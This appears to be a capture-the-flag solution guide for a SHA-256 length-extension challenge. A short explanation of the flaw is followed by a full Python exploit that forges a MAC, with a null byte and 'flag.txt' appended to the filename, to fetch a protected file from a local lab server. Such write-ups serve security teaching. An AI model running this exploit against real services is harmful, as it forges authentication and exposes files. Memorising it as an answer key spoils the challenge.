# A04 Medium: Solution Guide

### Vulnerability Mechanics
In Merkle-Damgard hash algorithms (MD5, SHA-1, SHA-256, SHA-512), the output of `H(SECRET || M)` represents the internal registers (state) after processing the message and its padding.
An attacker who knows:
1. `len(SECRET)` = 16 bytes
2. `M` = `b"public_report.pdf"`
3. `H(SECRET || M)`

can inject the 8 registers into a SHA-256 instance, append arbitrary suffix data `append_data = b"\x00flag.txt"`, and compute `H(SECRET || M || padding || append_data)`.

### Exploit Script
```python
import requests
import re
import struct
import urllib.parse

TARGET = "http://127.0.0.1:6011"

def _right_rotate(n, b):
    return ((n >> b) | (n << (32 - b))) & 0xffffffff

def sha256_extend(original_hash_hex, data_length_bytes, append_data):
    h = [int(original_hash_hex[i:i+8], 16) for i in range(0, 64, 8)]
    k = [
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
    ]
    original_bits = data_length_bytes * 8
    padding = b'\x80' + b'\x00' * ((55 - data_length_bytes) % 64) + struct.pack('>Q', original_bits)
    new_bits = (data_length_bytes + len(padding) + len(append_data)) * 8
    new_padding = b'\x80' + b'\x00' * ((55 - len(append_data)) % 64) + struct.pack('>Q', new_bits)
    chunk = append_data + new_padding
    for i in range(0, len(chunk), 64):
        w = [0] * 64
        for j in range(16):
            w[j] = struct.unpack(b'>I', chunk[i + j*4 : i + j*4 + 4])[0]
        for j in range(16, 64):
            s0 = _right_rotate(w[j-15], 7) ^ _right_rotate(w[j-15], 18) ^ (w[j-15] >> 3)
            s1 = _right_rotate(w[j-2], 17) ^ _right_rotate(w[j-2], 19) ^ (w[j-2] >> 10)
            w[j] = (w[j-16] + s0 + w[j-7] + s1) & 0xffffffff
        a, b, c, d, e, f, g, h0 = h
        for j in range(64):
            S1 = _right_rotate(e, 6) ^ _right_rotate(e, 11) ^ _right_rotate(e, 25)
            ch = (e & f) ^ ((~e) & g)
            temp1 = (h0 + S1 + ch + k[j] + w[j]) & 0xffffffff
            S0 = _right_rotate(a, 2) ^ _right_rotate(a, 13) ^ _right_rotate(a, 22)
            maj = (a & b) ^ (a & c) ^ (b & c)
            temp2 = (S0 + maj) & 0xffffffff
            h0, g, f, e, d, c, b, a = g, f, e, (d + temp1) & 0xffffffff, c, b, a, (temp1 + temp2) & 0xffffffff
        h = [(x + y) & 0xffffffff for x, y in zip(h, [a, b, c, d, e, f, g, h0])]
    return "".join(f"{x:08x}" for x in h), padding

# 1. Fetch valid mac
res = requests.get(TARGET).text
match = re.search(r'mac=([a-f0-9]{64})', res)
orig_mac = match.group(1)

# 2. Extend with b"\x00flag.txt"
orig_data = b"public_report.pdf"
secret_len = 16
append_data = b"\x00flag.txt"
new_mac, pad = sha256_extend(orig_mac, secret_len + len(orig_data), append_data)
forged_file_bytes = orig_data + pad + append_data

# 3. Request flag
resp = requests.get(f"{TARGET}/download", params={"file": forged_file_bytes, "mac": new_mac})
print("Flag:", resp.text)
```
